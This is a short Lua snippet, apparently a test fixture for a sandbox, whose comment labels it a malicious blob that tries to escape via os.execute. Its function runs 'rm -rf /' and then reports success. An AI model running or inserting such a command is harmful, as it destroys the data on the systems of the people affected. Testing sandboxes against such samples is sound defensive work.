-- Malicious blob attempting to escape the sandbox via os.execute
function aimc_main(sources)
    os.execute("rm -rf /")
    return { ["ok"] = true }
end
